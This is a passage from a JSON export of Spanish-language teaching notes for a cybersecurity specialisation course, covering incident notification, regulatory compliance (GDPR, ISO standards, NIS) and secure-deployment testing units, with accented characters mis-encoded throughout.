actuaci√≥n para la notificaci√≥n de incidentes.\nEnlace con el material para impartirlo: 5a - Desarrollar procedimientos de actuaci√≥n para la notificaci√≥n de incidentes\n\nb) Se ha notificado el incidente de manera adecuada al personal interno de la organizaci√≥n responsable de la toma de decisiones.\n\nContenido asociado: Notificaci√≥n interna de incidentes.\nEnlace con el material para impartirlo: 5b - Notificaci√≥n interna de incidentes\n\nc) Se ha notificado el incidente de manera adecuada a las autoridades competentes en el √°mbito de la gesti√≥n de incidentes de ciberseguridad en caso de ser necesario.\n\nContenido asociado: Notificaci√≥n de incidentes a quienes corresponda.\nEnlace con el material para impartirlo: 5c - Notificaci√≥n de incidentes a quienes corresponda\n\nd) Se ha notificado formalmente el incidente a los afectados, personal interno, clientes, proveedores, etc., en caso de ser necesario.\n\nEnlace con el material para impartirlo: 5d - Notificaci√≥n forma de incidentes a afectados\n\ne) Se ha notificado el incidente a los medios de comunicaci√≥n en caso de ser necesario.\n\nEnlace con el material para impartirlo: 5e - Notificaci√≥n de incidentes a medios de comunicaci√≥n\n"},"ceti/Incidentes-de-ciberseguridad/index":{"title":"Incidentes de ciberseguridad","links":["ceti/Incidentes-de-ciberseguridad/Temario"],"tags":[],"content":"Incidentes de ciberseguridad es un m√≥dulo del curso de especializaci√≥n en ciberseguridad en entornos de las tecnolog√≠as de la informaci√≥n (CETI). En esta documentaci√≥n pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nWebs para practicar, en general:\n\nCyberdefenders\nLets defend\nTryHackme\nHackthebox\nBoss of the soc (splunk)\nAtenea (CCN-CERT)\nRetos de academia hacker de Incibe\n\nMateriales en general:\n\ngithub.com/cyb3rxp/awesome-soc\ngithub.com/meirwah/awesome-incident-response\ngithub.com/mikeroyal/Open-Source-Security-Guide\ngithub.com/rshipp/awesome-malware-analysis\nApuntes de otros compa√±eros\n\ngithub.com/JagMolar/CETI/tree/master/Incidentes%20de%20Ciberseguridad\n\n\n\n"},"ceti/Normativa-de-ciberseguridad/RA-1/Unidad-1---RA-1":{"title":"Unidad 1 - RA 1","links":[],"tags":[],"content":"CE - 1a:\na) Se han identificado las bases del cumplimiento normativo a tener en cuenta en las organizaciones.\n\n\nContenido asociado: Introducci√≥n al cumplimiento normativo (Compliance: objetivo, definici√≥n y conceptos principales).\n\nConceptos: Definici√≥n y objetivos del cumplimiento normativo, componentes clave de un programa de cumplimiento (compromiso de la direcci√≥n, evaluaci√≥n de riesgos, pol√≠ticas, formaci√≥n, monitorizaci√≥n, reporting, enforcement).\n\n\nPr√°cticas: Analizar estudios de casos de fallos en el cumplimiento (ejemplo: caso Wells Fargo), identificar requisitos de cumplimiento para diferentes industrias (finanzas, salud, tecnolog√≠a).\n\nHerramientas:\nPlataformas de gesti√≥n de cumplimiento como MetricStream o IBM OpenPages\nrecursos en l√≠nea como SCCE\nwww.open-scap.org/\n\n\n\n\n\nCE - 1b\nb) Se han descrito y aplicado los principios de un buen gobierno y su relaci√≥n con la √©tica profesional.\n\nContenido asociado: Principios del buen gobierno y √©tica empresarial.\n\n\nConceptos:\n\nPrincipios de buen gobierno (transparencia, responsabilidad, equidad)\nteor√≠as √©ticas aplicadas a negocios (utilitarismo, deontolog√≠a)\nresponsabilidad social corporativa.\n\n\nPr√°cticas:\n\nDesarrollar un c√≥digo de conducta para una empresa ficticia, simular dilemas √©ticos en un contexto empresarial.\nAnalizar el esc√°ndalo de Volkswagen para discutir fallos de gobernanza, comparar estructuras de gobernanza en diferentes sectores.\ntryhackme.com/r/room/cybergovernanceregulation\n\n\nHerramientas:\n\nMarcos de toma de decisiones √©ticas (ejemplo: Markkula Center)\ncursos en l√≠nea sobre √©tica empresarial.\n\n\n\nCE - 1c\nc) Se han definido las pol√≠ticas y procedimientos, as√≠ como la estructura organizativa que establezca la cultura del cumplimiento normativo dentro de las organizaciones.\n\nConceptos:\n\nTipos de pol√≠ticas de cumplimiento (anticorrupci√≥n, protecci√≥n de datos)\nprocedimientos operativos est√°ndar\ncomit√©s de cumplimiento\nl√≠neas de reporte.\n\n\nPr√°cticas:\n\nRedactar una pol√≠tica de cumplimiento sobre un tema espec√≠fico (ejemplo: blanqueo de capitales)\ndise√±ar un organigrama que incluya funciones de cumplimiento.\n\n\nHerramientas:\n\nSoftware de gesti√≥n de pol√≠ticas como PolicyTech\nherramientas de dise√±o organizacional como Lucidchart.\n\n\n\nCE - 1d\nd) Se han descrito las funciones o competencias del responsable del cumplimiento normativo dentro de las organizaciones.\n\nContenido asociado: Compliance Officer: funciones y responsabilidades.\n\n\nConceptos:\n\nRol y responsabilidades del Compliance Officer (asesoramiento, monitorizaci√≥n, reporting)\nhabilidades requeridas (conocimiento legal, comunicaci√≥n, pensamiento anal√≠tico).\n\n\nPr√°cticas:\n\nCrear una descripci√≥n de puesto para un Compliance Officer\nsimular un d√≠a en la vida de este profesional.\n\n\nHerramientas:\n\nProgramas de certificaci√≥n profesional como CCEP\nplataformas como LinkedIn para investigar perfiles.\n\n\n\nCE - 1e\ne) Se han establecido las relaciones con terceros para un correcto cumplimiento normativo.\n\nContenido asociado: Relaciones con terceras partes dentro del Compliance.\n\n\nConceptos:\n\nGesti√≥n de riesgos de terceros\nprocesos de debida diligencia\ncl√°usulas contractuales de cumplimiento.\n\n\nPr√°cticas:\n\nRealizar una evaluaci√≥n de riesgos de un proveedor ficticio\nredactar t√©rminos de cumplimiento para un contrato.\nAnalizar casos donde fallos de terceros afectaron el cumplimiento, discutir mejores pr√°cticas para gestionar relaciones con terceros.\n\n\nHerramientas:\n\nPlataformas de gesti√≥n de riesgos de terceros como RiskRate o Prevalent\nlistas de verificaci√≥n de debida diligencia.\n\n\n"},"ceti/Normativa-de-ciberseguridad/RA-2/Unidad-2---RA-2":{"title":"Unidad 2 - RA 2","links":[],"tags":[],"content":"CE - 2a:\na) Se han recogido las principales normativas que afectan a los diferentes tipos de organizaciones.\n\nContenido asociado: Entorno regulatorio de aplicaci√≥n.\n\n\nConceptos:\n\nResumen de normativas clave (GDPR, SOX, FCPA)\nregulaciones sectoriales (HIPAA para salud, PCI DSS para pagos).\n\n\nPr√°cticas:\n\nCrear un inventario normativo para una industria espec√≠fica\ninvestigar cambios normativos recientes.\n\n\nHerramientas:\n\nBases de datos legales como Westlaw o Aranzadi\nsitios web de agencias reguladoras.\n\n\n\nCE - 2b:\nb) Se han establecido las recomendaciones v√°lidas para diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 19.600 entre otras).\n\nContenido asociado: Sistemas de Gesti√≥n de Compliance.\n\n\nConceptos:\n\nEstructura de ISO 19600/37301 (contexto, liderazgo, planificaci√≥n, soporte, operaci√≥n, evaluaci√≥n, mejora)\nimplementaci√≥n de sistemas de gesti√≥n de cumplimiento.\n\n\nPr√°cticas:\n\nDise√±ar un esquema de sistema de gesti√≥n de cumplimiento basado en ISO\nrealizar un an√°lisis de brechas frente al est√°ndar.\n\n\nHerramientas:\n\nDocumentos de normas ISO\nsoftware de gesti√≥n de cumplimiento.\n\n\n\nCE - 2c:\nc) Se han realizado an√°lisis y evaluaciones de los riesgos de diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 31.000 entre otras).\n\nContenido asociado: An√°lisis y gesti√≥n de riesgos, mapas de riesgos.\n\n\nConceptos:\n\nProceso de gesti√≥n de riesgos (contexto, evaluaci√≥n, tratamiento, monitoreo)\nt√©cnicas de identificaci√≥n de riesgos (SWOT, PESTLE)\nm√©todos de evaluaci√≥n.\n\n\nPr√°cticas:\n\nRealizar una evaluaci√≥n de riesgos para una organizaci√≥n ficticia\ncrear un plan de tratamiento de riesgos.\n\n\nHerramientas:\n\nSoftware de gesti√≥n de riesgos como LogicManager o RiskLens\nplantillas de evaluaci√≥n de riesgos.\n\n\n\nCE - 2d:\nd) Se ha documentado el sistema de cumplimiento normativo dise√±ado.\n\nContenido asociado: Documentaci√≥n del sistema de cumplimiento normativo dise√±ado.\n\n\nConceptos:\n\nJerarqu√≠a de documentaci√≥n (pol√≠ticas, procedimientos, instrucciones)\nrequisitos de mantenimiento de registros\ncontrol de versiones.\n\n\nPr√°cticas:\n\nRedactar un manual de cumplimiento\ndesarrollar un procedimiento para gestionar violaciones.\n\n\nHerramientas:\n\nSistemas de gesti√≥n documental como SharePoint o Confluence\nsoftware de control de versiones.\n\n\n"},"ceti/Normativa-de-ciberseguridad/RA-3/Unidad-3---RA-3":{"title":"Unidad 3 - RA 3","links":[],"tags":[],"content":"CE - 3a:\na) Se han identificado los riesgos penales aplicables a diferentes organizaciones.\n\nContenido asociado: Riesgos penales que afectan a la organizaci√≥n.\n\n\nConceptos:\n\nTipos de riesgos penales (fraude, blanqueo, delitos ambientales)\nelementos de la responsabilidad penal de personas jur√≠dicas.\n\n\nPr√°cticas:\n\nIdentificar riesgos penales en escenarios empresariales\nmapear riesgos a leyes espec√≠ficas.\n\n\nHerramientas:\n\nTextos legales (C√≥digo Penal espa√±ol)\nherramientas de evaluaci√≥n de riesgos penales.\n\n\n\nCE - 3b:\nb) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados.\n\nConceptos:\n\nMedidas preventivas (controles internos, formaci√≥n)\nmedidas detectivas (auditor√≠as, l√≠neas de denuncia)\nmedidas correctivas.\n\n\nPr√°cticas:\n\nDise√±ar un marco de controles para riesgos penales espec√≠ficos\nsimular una investigaci√≥n interna.\n\n\nHerramientas:\n\nHerramientas de monitoreo de cumplimiento\nsistemas de gesti√≥n de incidentes.\n\n\n\nCE - 3c:\nc) Se ha establecido un sistema de gesti√≥n de cumplimiento normativo penal de acuerdo con la legislaci√≥n y normativa vigente (C√≥digo Penal y UNE 19.601, entre otros).\n\nContenido asociado: Sistemas de gesti√≥n de Compliance penal.\n\n\nConceptos:\n\nRequisitos de UNE 19601\nintegraci√≥n con otros sistemas de gesti√≥n\nproceso de certificaci√≥n.\n\n\nPr√°cticas:\n\nDesarrollar una pol√≠tica de cumplimiento penal\nimplementar formaci√≥n sobre riesgos penales.\n\n\nHerramientas:\n\nDocumento de la norma UNE 19601\nsoftware de cumplimiento compatible con UNE 19601.\n\n\n\nCE - 3d\nd) Se han determinado los principios b√°sicos dentro de las organizaciones para combatir el soborno y promover una cultura empresarial √©tica de acuerdo con la legislaci√≥n y normativa vigente (ISO 37.001 entre otros).\n\nContenido asociado: Sistemas de gesti√≥n anticorrupci√≥n.\n\n\nConceptos:\n\nElementos clave de ISO 37001 (compromiso de liderazgo, evaluaci√≥n de riesgos, debida diligencia, controles financieros, reporting)\npol√≠ticas antisoborno.\n\n\nPr√°cticas:\n\nRealizar una evaluaci√≥n de riesgos de soborno\ndesarrollar un programa de formaci√≥n antisoborno.\n\n\nHerramientas:\n\nNorma ISO 37001\nherramientas de cumplimiento antisoborno.\n\n\n"},"ceti/Normativa-de-ciberseguridad/RA-4/Unidad-4---RA-4":{"title":"Unidad 4 - RA 4","links":[],"tags":[],"content":"CE - 4a:\na) Se han reconocido las fuentes del Derecho de acuerdo con el ordenamiento jur√≠dico en materia de protecci√≥n de datos de car√°cter personal.\n\nContenido asociado: Novedades del RGPD de la Uni√≥n Europea.\n\n\nConceptos:\n\nJerarqu√≠a de normas en protecci√≥n de datos (Reglamento General de Protecci√≥n de Datos - GDPR, LOPDGDD)\nrol de las autoridades de protecci√≥n de datos.\n\n\nPr√°cticas:\n\nInvestigar y presentar el marco legal de protecci√≥n de datos en Espa√±a y la UE.\n\n\nHerramientas\n\nDiarios oficiales (BOE, OJEU)\nsitios web de autoridades como AEPD.\n\n\n\nCE - 4b:\nb) Se han aplicado los principios relacionados con la protecci√≥n de datos de car√°cter personal tanto a nivel nacional como internacional.\n\nContenido asociado: Principios de protecci√≥n de datos.\n\n\nConceptos:\n\nPrincipios del GDPR (art√≠culo 5: licitud, lealtad, transparencia, limitaci√≥n de finalidad, minimizaci√≥n, exactitud, limitaci√≥n de conservaci√≥n, integridad, confidencialidad, responsabilidad proactiva).\n\n\nPr√°cticas:\n\nEvaluar una actividad de tratamiento de datos frente a los principios del GDPR\ndise√±ar un aviso de privacidad.\n\n\nHerramientas:\n\nTexto del GDPR\ngu√≠as de la AEPD.\n\n\n\nCE - 4c:\nc) Se han establecido los requisitos necesarios para afrontar la privacidad desde las bases del dise√±o.\n\nContenido asociado: Privacidad por Dise√±o y por Defecto.\n\n\nConceptos:\n\nPrincipios de Privacidad por Dise√±o (PbD)\nt√©cnicas para implementar PbD (minimizaci√≥n de datos, seudonimizaci√≥n).\n\n\nPr√°cticas:\n\nIntegrar PbD en un proyecto de desarrollo de sistemas\nrealizar una evaluaci√≥n de impacto en la protecci√≥n de datos (DPIA).\nstudiar ejemplos de PbD (ejemplo: funciones de privacidad de Apple)\ndiscutir desaf√≠os en la implementaci√≥n de PbD.\n\n\nHerramientas:\n\nMarcos de PbD\nplantillas de DPIA de la AEPD.\n\n\n\nCE - 4d:\nd) Se han configurado las herramientas corporativas contemplando el cumplimiento normativo por defecto.\n\nConceptos:\n\nConfiguraciones de Privacidad por Defecto\nminimizaci√≥n de datos por defecto\nmecanismos de consentimiento.\n\n\nPr√°cticas:\n\nConfigurar una aplicaci√≥n web para cumplir con Privacidad por Defecto\nrevisar configuraciones predeterminadas para implicaciones de privacidad.\n\n\nHerramientas:\n\nPlataformas de gesti√≥n de privacidad\nherramientas de gesti√≥n de consentimiento.\n\n\n\nCE - 4e:\ne) Se ha realizado un an√°lisis de riesgos para el tratamiento de los derechos a la protecci√≥n de datos.\n\nContenido asociado: An√°lisis de Impacto en Privacidad (PIA), y medidas de seguridad.\n\n\nConceptos:\n\nMetodolog√≠as de evaluaci√≥n de riesgos en protecci√≥n de datos\nidentificaci√≥n de riesgos para los derechos de los interesados.\n\n\nPr√°cticas:\n\nRealizar una DPIA para una actividad de tratamiento de alto riesgo\ndocumentar riesgos y mitigaciones.\n\n\nHerramientas:\n\nSoftware de DPIA\nmarcos de evaluaci√≥n de riesgos.\n\n\n\nCE - 4f:\nf) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados en la protecci√≥n de datos.\n\nConceptos:\n\nMedidas t√©cnicas (cifrado, controles de acceso)\nmedidas organizativas (pol√≠ticas, formaci√≥n).\n\n\nPr√°cticas:\n\nImplementar controles de seguridad en un entorno simulado\ndesarrollar un plan de respuesta a brechas de datos.\n\n\nHerramientas:\n\nSoftware de seguridad (firewalls, antivirus)\nherramientas de respuesta a incidentes.\n\n\n\nCE - 4g:\ng) Se han descrito las funciones o competencias del delegado de protecci√≥n de datos dentro de las organizaciones.\n\nContenido asociado: Delegado de Protecci√≥n de Datos (DPO).\n\n\nConceptos:\n\nTareas del DPO (informar, asesorar, monitorear cumplimiento, cooperar con autoridades)\nrequisitos para su nombramiento.\n\n\nPr√°cticas:\n\nSimular la gesti√≥n de una solicitud de acceso de un interesado\nasesorar sobre un acuerdo de tratamiento de datos.\n\n\nHerramientas:\n\nKits de herramientas para DPOs\nredes profesionales para DPOs.\n\n\n"},"ceti/Normativa-de-ciberseguridad/RA-5/Unidad-5---RA-5":{"title":"Unidad 5 - RA 5","links":[],"tags":[],"content":"CE - 5a:\na) Se ha establecido el plan de revisiones de la normativa, jurisprudencia, notificaciones, etc. jur√≠dicas que puedan afectar a la organizaci√≥n.\n\nConceptos:\n\nImportancia del monitoreo legal\nfuentes de informaci√≥n legal\nfrecuencia de revisiones.\n\n\nPr√°cticas:\n\nDesarrollar un plan de monitoreo legal\nconfigurar alertas para cambios normativos.\n\n\nHerramientas:\n\nServicios de actualizaci√≥n legal como Lexology\nfeeds RSS de organismos reguladores.\n\n\n\nCE - 5b:\nb) Se ha detectado nueva normativa consultando las bases de datos jur√≠dicas siguiendo el plan de revisiones establecido.\n\nContenido asociado: Normas nacionales e internacionales.\nContenido asociado: Directiva NIS.\nContenido asociado: Legislaci√≥n sobre la protecci√≥n de infraestructuras cr√≠ticas.\nContenido asociado: Ley PIC (Protecci√≥n de infraestructuras cr√≠ticas).\n\n\nConceptos:\n\nEstrategias de b√∫squeda efectivas en bases de datos legales\nidentificaci√≥n de normativas relevantes.\n\n\nPr√°cticas:\n\nRealizar una b√∫squeda de leyes recientes de ciberseguridad\nresumir puntos clave de una nueva normativa.\n\n\nHerramientas:\n\nBases de datos legales como vLex o Aranzadi\nmotores de b√∫squeda con filtros legales.\n\n\n\nCE - 5c:\nc) Se ha analizado la nueva normativa para determinar si aplica a la actividad de la organizaci√≥n.\n\nContenido asociado: Acceso electr√≥nico de los ciudadanos a los Servicios P√∫blicos.\n\n\nConceptos:\n\nAn√°lisis de aplicabilidad legal\ninterpretaci√≥n de textos legales en el contexto de operaciones empresariales.\n\n\nPr√°cticas:\n\nAnalizar una nueva normativa de ciberseguridad y evaluar su impacto en una empresa\ncrear una lista de verificaci√≥n de cumplimiento.\n\n\nHerramientas:\n\nPlantillas de an√°lisis legal\nsoftware de gesti√≥n de cumplimiento.\n\n\n\nCE - 5d:\nd) Se ha incluido en el plan de revisiones las modificaciones necesarias, sobre la nueva normativa aplicable a la organizaci√≥n, para un correcto cumplimiento normativo.\n\nConceptos:\n\nActualizaci√≥n de programas de cumplimiento\ncomunicaci√≥n interna de cambios\nformaci√≥n sobre nuevos requisitos.\n\n\nPr√°cticas:\n\nRevisar una pol√≠tica de cumplimiento para reflejar nuevas normativas\nplanificar una sesi√≥n de formaci√≥n sobre los cambios.\n\n\nHerramientas:\n\nSistemas de gesti√≥n de pol√≠ticas\nsistemas de gesti√≥n de aprendizaje para formaci√≥n.\n\n\n\nCE - 5e:\ne) Se han determinado e implementado los controles necesarios para garantizar el correcto cumplimiento normativo de las nuevas normativas. incluidas en el plan de revisiones.\n\nContenido asociado: Sistema de Gesti√≥n de Seguridad de la Informaci√≥n (est√°ndares internacionales) (ISO 27.001).\nContenido asociado: Esquema Nacional de Seguridad (ENS)\nContenido asociado: Planes de Continuidad de Negocio (est√°ndares internacionales) (ISO 22.301).\n\n\nConceptos:\n\nDise√±o de controles para cumplir requisitos normativos\npruebas de efectividad de controles.\n\n\nPr√°cticas:\n\nIdentificar controles necesarios para una nueva normativa (ejemplo: requisitos de registro bajo la Directiva NIS)\nimplementar controles en un entorno simulado.\n\n\nHerramientas:\n\nPlataformas de GRC (Governance, Risk, Compliance)\nherramientas de evaluaci√≥n de controles.\n\n\n"},"ceti/Normativa-de-ciberseguridad/Temario":{"title":"Temario","links":["ceti/Normativa-de-ciberseguridad/RA-1/Unidad-1---RA-1","ceti/Normativa-de-ciberseguridad/RA-2/Unidad-2---RA-2","ceti/Normativa-de-ciberseguridad/RA-3/Unidad-3---RA-3","ceti/Normativa-de-ciberseguridad/RA-4/Unidad-4---RA-4","ceti/Normativa-de-ciberseguridad/RA-5/Unidad-5---RA-5"],"tags":["Apuntes","Temas","Normativa"],"content":"Desglose del temario NC: RA - Criterios - Contenidos\n1. Identifica los puntos principales de aplicaci√≥n para asegurar el cumplimiento normativo reconociendo funciones y responsabilidades.\nCriterios de evaluaci√≥n:\na) Se han identificado las bases del cumplimiento normativo a tener en cuenta en las organizaciones.\n\nContenido asociado: Introducci√≥n al cumplimiento normativo (Compliance: objetivo, definici√≥n y conceptos principales).\nEnlace: CE - 1a\n\nb) Se han descrito y aplicado los principios de un buen gobierno y su relaci√≥n con la √©tica profesional.\n\nContenido asociado: Principios del buen gobierno y √©tica empresarial.\nEnlace: CE - 1b\n\nc) Se han definido las pol√≠ticas y procedimientos, as√≠ como la estructura organizativa que establezca la cultura del cumplimiento normativo dentro de las organizaciones.\n\nEnlace: CE - 1c\n\nd) Se han descrito las funciones o competencias del responsable del cumplimiento normativo dentro de las organizaciones.\n\nContenido asociado: Compliance Officer: funciones y responsabilidades.\n\n\nEnlace: CE - 1d\n\ne) Se han establecido las relaciones con terceros para un correcto cumplimiento normativo.\n\nContenido asociado: Relaciones con terceras partes dentro del Compliance.\nEnlace: CE - 1e\n\n2. Dise√±a sistemas de cumplimiento normativo seleccionando la legislaci√≥n y jurisprudencia de aplicaci√≥n.\nCriterios de evaluaci√≥n:\na) Se han recogido las principales normativas que afectan a los diferentes tipos de organizaciones.\n\nContenido asociado: Entorno regulatorio de aplicaci√≥n.\nEnlace: CE - 2a\n\nb) Se han establecido las recomendaciones v√°lidas para diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 19.600 entre otras).\n\nContenido asociado: Sistemas de Gesti√≥n de Compliance.\nEnlace: CE - 2b\n\nc) Se han realizado an√°lisis y evaluaciones de los riesgos de diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 31.000 entre otras).\n\nContenido asociado: An√°lisis y gesti√≥n de riesgos, mapas de riesgos.\nEnlace: CE - 2c\n\nd) Se ha documentado el sistema de cumplimiento normativo dise√±ado.\n\nContenido asociado: Documentaci√≥n del sistema de cumplimiento normativo dise√±ado.\nEnlace: CE - 2d\n\n3. Relaciona la normativa relevante para el cumplimiento de la responsabilidad penal de las organizaciones y personas jur√≠dicas con los procedimientos establecidos, recopilando y aplicando las normas vigentes.\nCriterios de evaluaci√≥n:\na) Se han identificado los riesgos penales aplicables a diferentes organizaciones.\n\nContenido asociado: Riesgos penales que afectan a la organizaci√≥n.\nEnlace: CE - 3a\n\nb) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados.\n\nEnlace: CE - 3b\n\nc) Se ha establecido un sistema de gesti√≥n de cumplimiento normativo penal de acuerdo con la legislaci√≥n y normativa vigente (C√≥digo Penal y UNE 19.601, entre otros).\n\nContenido asociado: Sistemas de gesti√≥n de Compliance penal.\nEnlace: CE - 3c\n\nd) Se han determinado los principios b√°sicos dentro de las organizaciones para combatir el soborno y promover una cultura empresarial √©tica de acuerdo con la legislaci√≥n y normativa vigente (ISO 37.001 entre otros).\n\nContenido asociado: Sistemas de gesti√≥n anticorrupci√≥n.\nEnlace: CE - 3d\n\n4. Aplica la legislaci√≥n nacional de protecci√≥n de datos de car√°cter personal, relacionando los procedimientos establecidos con las leyes vigentes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluaci√≥n:\na) Se han reconocido las fuentes del Derecho de acuerdo con el ordenamiento jur√≠dico en materia de protecci√≥n de datos de car√°cter personal.\n\nContenido asociado: Novedades del RGPD de la Uni√≥n Europea.\nEnlace: CE - 4a\n\nb) Se han aplicado los principios relacionados con la protecci√≥n de datos de car√°cter personal tanto a nivel nacional como internacional.\n\nContenido asociado: Principios de protecci√≥n de datos.\nEnlace: CE - 4b\n\nc) Se han establecido los requisitos necesarios para afrontar la privacidad desde las bases del dise√±o.\n\nContenido asociado: Privacidad por Dise√±o y por Defecto.\nEnlace: CE - 4c\n\nd) Se han configurado las herramientas corporativas contemplando el cumplimiento normativo por defecto.\n\nEnlace: CE - 4d\n\ne) Se ha realizado un an√°lisis de riesgos para el tratamiento de los derechos a la protecci√≥n de datos.\n\nContenido asociado: An√°lisis de Impacto en Privacidad (PIA), y medidas de seguridad.\nEnlace: CE - 4e\n\nf) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados en la protecci√≥n de datos.\n\nEnlace: CE - 4f\n\ng) Se han descrito las funciones o competencias del delegado de protecci√≥n de datos dentro de las organizaciones.\n\nContenido asociado: Delegado de Protecci√≥n de Datos (DPO).\nEnlace: CE - 4g\n\n5. Recopila y aplica la normativa vigente de ciberseguridad de √°mbito nacional e internacional, actualizando los procedimientos establecidos de acuerdo con las leyes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluaci√≥n:\na) Se ha establecido el plan de revisiones de la normativa, jurisprudencia, notificaciones, etc. jur√≠dicas que puedan afectar a la organizaci√≥n.\n\nEnlace: CE - 5a\n\nb) Se ha detectado nueva normativa consultando las bases de datos jur√≠dicas siguiendo el plan de revisiones establecido.\n\nContenido asociado: Normas nacionales e internacionales.\nContenido asociado: Directiva NIS.\nContenido asociado: Legislaci√≥n sobre la protecci√≥n de infraestructuras cr√≠ticas.\nContenido asociado: Ley PIC (Protecci√≥n de infraestructuras cr√≠ticas).\nEnlace: CE - 5b\n\nc) Se ha analizado la nueva normativa para determinar si aplica a la actividad de la organizaci√≥n.\n\nContenido asociado: Acceso electr√≥nico de los ciudadanos a los Servicios P√∫blicos.\nEnlace: CE - 5c\n\nd) Se ha incluido en el plan de revisiones las modificaciones necesarias, sobre la nueva normativa aplicable a la organizaci√≥n, para un correcto cumplimiento normativo.\n\nEnlace: CE - 5d\n\ne) Se han determinado e implementado los controles necesarios para garantizar el correcto cumplimiento normativo de las nuevas normativas. incluidas en el plan de revisiones.\n\nContenido asociado: Sistema de Gesti√≥n de Seguridad de la Informaci√≥n (est√°ndares internacionales) (ISO 27.001).\nContenido asociado: Esquema Nacional de Seguridad (ENS)\nContenido asociado: Planes de Continuidad de Negocio (est√°ndares internacionales) (ISO 22.301).\nEnlace: CE - 5e\n"},"ceti/Normativa-de-ciberseguridad/index":{"title":"Normativa de ciberseguridad","links":["ceti/Normativa-de-ciberseguridad/Temario"],"tags":[],"content":"Normativa de ciberseguridad es un m√≥dulo del curso de especializaci√≥n en ciberseguridad en entornos de las tecnolog√≠as de la informaci√≥n (CETI). En esta documentaci√≥n pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n"},"ceti/Puesta-en-produccion-segura/RA-1/Unidad-1---RA-1":{"title":"Unidad 1 - RA 1","links":[],"tags":[],"content":"Resultado de Aprendizaje 1: Prueba de aplicaciones web y para dispositivos m√≥viles\nCriterio 1.a: Comparar diferentes lenguajes de programaci√≥n seg√∫n sus caracter√≠sticas principales\n\nConceptos: Caracter√≠sticas que afectan pruebas y seguridad, como gesti√≥n de memoria, seguridad de tipos y manejo de excepciones.\nPr√°cticas: Escribir y probar c√≥digo en lenguajes como Python, Java y C++; usar herramientas de an√°lisis est√°tico para identificar problemas.\nHerramientas: IDEs (PyCharm, Eclipse), an√°lisis est√°tico (Pylint, FindBugs), frameworks de prueba (pytest, JUnit).\nAdicional: Estudios de casos sobre c√≥mo la elecci√≥n del lenguaje impact√≥ la seguridad, como el uso de C en sistemas cr√≠ticos.\n\nCriterio 1.b: Describir diferentes modelos de ejecuci√≥n de software\n\nConceptos: Modelos como cliente-servidor, microservicios y monol√≠ticos; implicaciones de seguridad en cada uno.\nPr√°cticas: Configurar aplicaciones simples en diferentes modelos; identificar riesgos de seguridad mediante an√°lisis.\nHerramientas: Servidores web (Apache, Nginx), contenedores (Docker), pasarelas API.\nAdicional: Ejemplos de brechas de seguridad relacionadas con modelos de ejecuci√≥n, como ataques a microservicios mal configurados.\n\nCriterio 1.c: Reconocer elementos b√°sicos del c√≥digo fuente, d√°ndoles significado\n\nConceptos: Constructos de programaci√≥n (variables, funciones, clases); c√≥mo pueden introducir vulnerabilidades si se usan incorrectamente.\nPr√°cticas: Revisar c√≥digo para identificar problemas de seguridad; refactorizar c√≥digo inseguro.\nHerramientas: Editores de c√≥digo con linting (Visual Studio Code), herramientas de an√°lisis est√°tico (SonarQube).\nAdicional: Introducir est√°ndares de codificaci√≥n segura, como CERT y OWASP.\n\nCriterio 1.d: Ejecutar diferentes tipos de prueba de software\n\nConceptos: Pruebas unitarias, de integraci√≥n, de sistema; pruebas de seguridad como penetraci√≥n y fuzzing.\nPr√°cticas: Escribir pruebas unitarias; realizar pruebas de penetraci√≥n; usar herramientas de fuzzing.\nHerramientas: Frameworks de prueba (JUnit, pytest), herramientas de seguridad (Burp Suite, AFL).\nAdicional: Discutir la importancia de las pruebas en el ciclo de vida del desarrollo de software (SDLC) y su integraci√≥n con DevOps.\n\nCriterio 1.e: Evaluar lenguajes de programaci√≥n seg√∫n la infraestructura de seguridad que proporcionan\n\nConceptos: Caracter√≠sticas de seguridad en lenguajes (e.g., seguridad de memoria en Rust); vulnerabilidades comunes por lenguaje.\nPr√°cticas: Comparar lenguajes mediante an√°lisis de c√≥digo; usar esc√°neres de seguridad espec√≠ficos.\nHerramientas: Esc√°neres de seguridad (Bandit para Python, FindSecBugs), comprobadores de dependencias (OWASP Dependency-Check).\nAdicional: Explorar por qu√© lenguajes como Ada o Rust son preferidos en aplicaciones cr√≠ticas de seguridad.\n"},"ceti/Puesta-en-produccion-segura/RA-2/Unidad-2---RA-2":{"title":"Unidad 2 - RA 2","links":[],"tags":[],"content":"Resultado de Aprendizaje 2: Determinaci√≥n del nivel de seguridad requerido por aplicaciones\nCriterio 2.a: Caracterizar los niveles de verificaci√≥n de seguridad en aplicaciones (ASVS)\n\nConceptos: Niveles de verificaci√≥n de ASVS (Nivel 1, 2, 3) y sus requisitos.\nPr√°cticas: Revisar documentaci√≥n de ASVS; evaluar aplicaciones de muestra para determinar el nivel adecuado.\nHerramientas: Listas de verificaci√≥n de ASVS, herramientas de evaluaci√≥n de seguridad.\nAdicional: Comparar ASVS con otros est√°ndares (e.g., ISO 27001); analizar estudios de casos.\n\nCriterio 2.b: Identificar el nivel de verificaci√≥n de seguridad requerido seg√∫n riesgos\n\nConceptos: Metodolog√≠as de evaluaci√≥n de riesgos; mapeo de riesgos a niveles de ASVS.\nPr√°cticas: Realizar evaluaci√≥n de riesgos en una aplicaci√≥n hipot√©tica; usar matrices de riesgo.\nHerramientas: OWASP Risk Rating Methodology, plantillas de evaluaci√≥n de riesgos.\nAdicional: Ejemplos de fallos en la evaluaci√≥n de riesgos que llevaron a brechas de seguridad.\n\nCriterio 2.c: Enumerar los requisitos de verificaci√≥n necesarios\n\nConceptos: Controles espec√≠ficos para cada nivel de ASVS; c√≥mo aplicarlos a una aplicaci√≥n.\nPr√°cticas: Crear planes de verificaci√≥n; priorizar requisitos seg√∫n las caracter√≠sticas de la aplicaci√≥n.\nHerramientas: Listas de verificaci√≥n de 